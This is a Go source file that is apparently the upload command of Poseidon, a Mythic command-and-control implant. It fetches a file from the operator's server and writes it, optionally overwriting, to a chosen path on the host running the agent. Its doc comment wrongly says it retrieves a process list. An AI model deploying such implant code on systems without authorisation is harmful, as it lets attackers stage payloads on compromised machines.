package upload

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var mu sync.Mutex

type uploadArgs struct {
	FileID     string `json:"file_id"`
	RemotePath string `json:"remote_path"`
	Overwrite  bool   `json:"overwrite"`
}

type getFile func(r structs.FileRequest, ch chan []byte) ([]byte, error)

//Run - interface method that retrieves a process list
func Run(task structs.Task, ch chan []byte, f getFile) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	// File upload
	args := uploadArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}

	r := structs.FileRequest{}
	r.TaskID = task.TaskID
	r.FileID = args.FileID
	r.FullPath, _ = filepath.Abs(args.RemotePath)
	r.ChunkNumber = 0
	r.TotalChunks = 0

	fBytes, err := f(r, ch)

	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to get file. Reason: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}

	switch _, err = os.Stat(args.RemotePath); err {
	case nil:
		if args.Overwrite {
			fp, err := os.OpenFile(args.RemotePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
			if err != nil {
				msg.SetError(fmt.Sprintf("Failed to get handle on %s: %s", args.RemotePath, err.Error()))
				encErrResp, _ := json.Marshal(msg)
				mu.Lock()
				profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
				mu.Unlock()
				return
			}
			defer fp.Close()
			fp.Write(fBytes)
			break
		} else {
			msg.SetError(fmt.Sprintf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", args.RemotePath))
			encErrResp, _ := json.Marshal(msg)
			mu.Lock()
			profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
			mu.Unlock()
			return
		}
	default:
		fp, err := os.Create(args.RemotePath)
		if err != nil {
			msg.SetError(fmt.Sprintf("Failed to create file %s. Reason: %s", args.RemotePath, err.Error()))
			encErrResp, _ := json.Marshal(msg)
			mu.Lock()
			profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
			mu.Unlock()
			return
		}
		defer fp.Close()
		fp.Write(fBytes)
		break
	}

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Uploaded %d bytes to %s", len(fBytes), args.RemotePath)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
